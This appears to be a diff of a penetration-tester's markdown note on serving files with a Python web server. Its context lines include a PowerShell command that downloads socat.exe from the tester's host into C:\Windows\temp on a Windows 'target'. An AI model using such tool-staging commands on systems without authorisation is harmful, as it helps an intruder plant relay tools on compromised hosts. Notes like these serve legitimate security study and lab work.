@@ -3,6 +3,7 @@
 **Purpose:** transfer files using http
 
 ---
+more advanced alternative: [[3 Tools/sharing files/updog|updog]]
 # Info
 sets up a 3 python webserver, then you can access files from remote machines that you are reachable from
 # Usage
@@ -15,3 +16,4 @@ on Linux target:
 `chmod +x FILENAME.sh` to make executable
 
 on Windows target: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
+
